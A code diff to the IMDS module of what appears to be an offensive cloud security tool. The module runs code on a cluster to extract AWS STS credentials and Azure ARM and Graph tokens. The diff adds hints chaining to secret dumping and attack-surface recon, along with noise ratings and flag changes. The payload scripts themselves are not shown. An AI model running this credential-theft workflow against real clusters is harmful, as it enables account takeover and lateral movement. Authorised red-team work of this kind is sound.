@@ -1,6 +1,6 @@
 """IMDS module — cloud credential extraction via cluster IMDS (requires --aggressive)"""
 
-from bb.core.display import console
+from bb.core.display import console, next_step
 
 
 _AWS_SCRIPT = """
@@ -57,7 +57,7 @@ def _exec_on_cluster(w, cluster_id: str, script: str):
 def _get_cluster(flags) -> str:
     cluster_id = flags.get("cluster") or flags.get("id")
     if not cluster_id:
-        cluster_id = input("Cluster ID (running): ").strip()
+        cluster_id = input("Cluster ID (from: compute clusters --run): ").strip()
     return cluster_id
 
 
@@ -70,6 +70,8 @@ def run_aws(w, conn, profile, flags):
     try:
         output = _exec_on_cluster(w, cluster_id, _AWS_SCRIPT)
         console.print(f"[yellow]{output}[/yellow]")
+        next_step("secrets dump --cluster <cluster_id> --aggressive --run",
+                  "recon attack-surface --run")
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
@@ -83,6 +85,8 @@ def run_azure_arm(w, conn, profile, flags):
     try:
         output = _exec_on_cluster(w, cluster_id, _AZURE_ARM_SCRIPT)
         console.print(f"[yellow]{output}[/yellow]")
+        next_step("imds azure-graph --cluster <cluster_id> --aggressive --run",
+                  "secrets dump --cluster <cluster_id> --aggressive --run")
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
@@ -96,6 +100,8 @@ def run_azure_graph(w, conn, profile, flags):
     try:
         output = _exec_on_cluster(w, cluster_id, _AZURE_GRAPH_SCRIPT)
         console.print(f"[yellow]{output}[/yellow]")
+        next_step("imds azure-arm --cluster <cluster_id> --aggressive --run",
+                  "secrets dump --cluster <cluster_id> --aggressive --run")
     except Exception as e:
         console.print(f"[red]Error: {e}[/red]")
 
@@ -103,32 +109,35 @@ def run_azure_graph(w, conn, profile, flags):
 COMMANDS = {
     "aws": {
         "description": "Extract AWS STS credentials from cluster IMDS",
-        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Low — single metadata call",
+        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Medium — creates cluster execution context",
         "prereqs": ["Running cluster ID", "--aggressive flag"],
         "caveats": [
             "IMDSv2 used — token fetched before credential request",
             "Cluster must have an instance profile attached",
         ],
         "aggressive": ["Cluster code execution via IMDS"],
-        "flags": [("--cluster ID", "Running cluster ID")],
+        "flags": [("--cluster ID", "Running cluster ID"), ("--id ID", "Alias for --cluster")],
+        "required_flags": ["--cluster"],
         "fn": run_aws,
     },
     "azure-arm": {
         "description": "Extract Azure ARM bearer token from cluster managed identity",
-        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Low",
+        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Medium — creates cluster execution context",
         "prereqs": ["Running cluster ID", "--aggressive flag", "Azure workspace"],
         "caveats": ["Token valid for management.azure.com — use for ARM API calls"],
         "aggressive": ["Cluster code execution via IMDS"],
-        "flags": [("--cluster ID", "Running cluster ID")],
+        "flags": [("--cluster ID", "Running cluster ID"), ("--id ID", "Alias for --cluster")],
+        "required_flags": ["--cluster"],
         "fn": run_azure_arm,
     },
     "azure-graph": {
         "description": "Extract Azure Graph bearer token from cluster managed identity",
-        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Low",
+        "activity": ["cred", "latm"], "type": "EXEC", "noise": "Medium — creates cluster execution context",
         "prereqs": ["Running cluster ID", "--aggressive flag", "Azure workspace"],
         "caveats": ["Token valid for graph.microsoft.com — use for AAD/Entra API calls"],
         "aggressive": ["Cluster code execution via IMDS"],
-        "flags": [("--cluster ID", "Running cluster ID")],
+        "flags": [("--cluster ID", "Running cluster ID"), ("--id ID", "Alias for --cluster")],
+        "required_flags": ["--cluster"],
         "fn": run_azure_graph,
     },
 }
